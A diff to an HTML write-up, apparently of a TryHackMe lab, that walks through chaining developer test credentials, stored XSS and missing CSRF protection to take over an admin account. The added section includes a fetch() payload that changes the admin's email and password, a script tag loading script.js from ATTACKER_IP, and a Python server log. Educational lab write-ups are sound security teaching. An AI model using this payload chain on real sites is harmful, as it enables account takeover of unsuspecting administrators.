@@ -129,7 +129,7 @@ Also, be clear about the <strong>impact escalation</strong>:<br>
 <p>In this task, we're going to walk through a full attack chain, piece by piece. Each stage will show how what seems like a small weakness can open the door to something much bigger. This isn't about discovering a single critical bug. It's about recognising how multiple minor flaws, when combined, can lead to a complete compromise of the system.</p>
 
 <h3 align="center">Step 1 : Developer Test Credentials</h3>
-<p>The first thing you do when approaching any login form is to try the easy stuff. In this case, the web application hosted at <code>http://xx.xxx.xx.xxx/</code> has a test account left behind by the developer: <code>testuser</code> with the password <code>***********</code>. This isn't uncommon, devs often leave test data in place during staging, and if it makes its way into production, it's an easy win for attackers.</p>p>
+<p>The first thing you do when approaching any login form is to try the easy stuff. In this case, the web application hosted at <code>http://xx.xxx.xx.xxx/</code> has a test account left behind by the developer: <code>testuser</code> with the password <code>***********</code>. This isn't uncommon, devs often leave test data in place during staging, and if it makes its way into production, it's an easy win for attackers.</p>
 
 <h6 align="center"><img width="500px" src="https://github.com/user-attachments/assets/4edf91b9-3aa2-4e76-af31-8a9d713c6c89"><br>This image and all the theoretical content of the present article is TryHackMe´s property.<br></h6>
 
@@ -138,15 +138,59 @@ Also, be clear about the <strong>impact escalation</strong>:<br>
 <h6 align="center"><img width="500px" src="https://github.com/user-attachments/assets/7fac175e-11c8-4295-ae00-2e67a75e89a6"><br>This image and all the theoretical content of the present article is TryHackMe´s property.<br></h6>
 
 <h3 align="center">Step 2 : Stored XSS in User Profile</h3>
-<p>After logging in, you explore the edit profile page and notice that the "display name" field reflects input directly into the page without proper sanitisation. You try inserting a basic payload like <script>alert(1)</script>, and sure enough, it executes when the profile is viewed.</p>
+<p>After logging in, you explore the edit profile page and notice that the "display name" field reflects input directly into the page without proper sanitisation. You try inserting a basic payload like <code><script>alert(1)</script></code>, and sure enough, it executes when the profile is viewed.</p>
+
+<h6 align="center"><img width="500px" src="https://github.com/user-attachments/assets/b45dfb9d-2845-4c06-adfc-ae916a6e1608"><br>This image and all the theoretical content of the present article is TryHackMe´s property.<br><br>
+                   <img width="500px" src="https://github.com/user-attachments/assets/385c9136-f6df-4f43-b67a-ab5cee0b439d"><br></h6>
+
+<p>This is where the attacker mindset kicks in. The vulnerability is clear, but how can we use it to escalate? We know that an admin might view this profile (perhaps as part of a moderation flow), so now it's about turning that into something actionable.</p>p>
 
 <h3 align="center">Step 3 : CSRF via XSS - Changing Admin Credentials</h3>
+<p>Let's pause and be clear: with a stored XSS like this, you could achieve account takeover entirely using JavaScript alone. You might read DOM content, extract CSRF tokens, and craft a legitimate request.<br>
 
+In our case, the application <strong>doesn't implement CSRF tokens at all</strong>. That makes things simpler. When your XSS fires in the admin's browser, you can just send a same-origin POST request to change the admin's email and password, and the browser will attach cookies automatically.</p>
 
+<p>Here's the script you can host on your attacker box:<br>
+
+Note: Save the script below as script.js </p>
+
+```bash
+fetch('/update_email.php', {
+  method: 'POST',
+  credentials: 'include',
+  headers: {'Content-Type':'application/x-www-form-urlencoded'},
+  body: 'email=pwnedadmin@evil.local&password=pwnedadmin'
+});
+```
+
+<p>Once the admin views your profile (with this script injected), their session will silently issue that request, and their credentials will be updated.</p>
+
+<h6 align="center"><img width="500px" src="https://github.com/user-attachments/assets/c3817c62-32a8-4ca1-8b0b-1d3b89803324"><br></h6>
+
+<p>To inject this, just set your display name to:</p>
+
+```bash
+<script src="http://ATTACKER_IP:8000/script.js"></script>
+```
+<p>Make sure your attacker machine is serving script.js with Python:</p>
+
+```bash
+user@tryhackme:~$ python3 -m http.server 8000
+Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
+MACHINE_IP - - [06/Jul/2025 20:14:05] "GET /script.js HTTP/1.1" 200 -
+```
+
+<h6 align="center"><img width="500px" src="https://github.com/user-attachments/assets/f869f605-cd60-43f1-ad83-f7df85d140e1"><br></h6>
 
 <h3 align="center">Step 4 : Login as Admin</h3>
+<p>At this point, your XSS has done its job; the admin's credentials were changed without them knowing. You can now log in as the admin using the password you set in the payload:<br>
 
+- Username: admin<br>
+- Password: **********</p>
 
+<h6 align="center"><img width="500px" src=""https://github.com/user-attachments/assets/0cbf2923-f910-4013-befc-c7263e7d0260"><br></h6>
+
+<p>All the admin functionality is now available to you, because the application trusts that whoever is logged in with that account has the right to use those features. But you got here not by guessing the admin password, but by chaining smaller issues together: weak credentials, XSS, missing CSRF protection.</p>
 
 <h2 align="center">Why Each Step Worked</h2>
 <p>At every stage, the attack succeeded because the application made assumptions that weren't enforced:<br>
